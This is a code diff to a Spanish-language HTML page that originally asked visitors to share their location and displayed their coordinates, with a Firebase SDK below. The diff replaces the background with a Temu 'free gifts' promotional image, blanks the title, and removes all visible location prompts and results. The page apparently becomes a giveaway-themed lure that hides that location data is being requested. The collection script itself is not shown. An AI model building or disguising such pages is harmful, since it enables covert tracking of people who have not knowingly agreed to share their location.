@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Compartiendo Ubicación...</title>
+    <title>Compartiendo </title>
     <style>
         * {
             margin: 0;
@@ -13,22 +13,42 @@
         
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: #FF6B00;
+            background-image: url('https://www.movilzona.es/app/uploads-movilzona.es/2023/06/regalos-gratis-de-temu.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
+            position: relative;
+        }
+        
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.1);
+            z-index: 0;
         }
         
         .container {
-            background: white;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
             border-radius: 20px;
             padding: 40px;
             max-width: 500px;
             width: 100%;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
             text-align: center;
+            position: relative;
+            z-index: 1;
         }
         
         .spinner {
@@ -141,27 +161,6 @@
 </head>
 <body>
     <div class="container">
-        <div class="spinner" id="spinner"></div>
-        <div class="icon" id="icon">📍</div>
-        
-        <h1 id="title">Obteniendo tu ubicación...</h1>
-        <p id="message">Por favor, permite el acceso a tu ubicación cuando te lo pida el navegador.</p>
-        
-        <div id="status" class="status loading">
-            Esperando permisos...
-        </div>
-        
-        <div id="locationDetails" class="location-details">
-            <h3>✅ Ubicación Compartida</h3>
-            <p><strong>Latitud:</strong> <span id="lat"></span></p>
-            <p><strong>Longitud:</strong> <span id="lon"></span></p>
-            <p><strong>Precisión:</strong> <span id="accuracy"></span> metros</p>
-            <p><strong>Hora:</strong> <span id="time"></span></p>
-        </div>
-        
-        <button id="whatsappBtn" onclick="shareViaWhatsApp()">
-            💚 Enviar también por WhatsApp
-        </button>
     </div>
 
     <!-- Firebase SDK -->
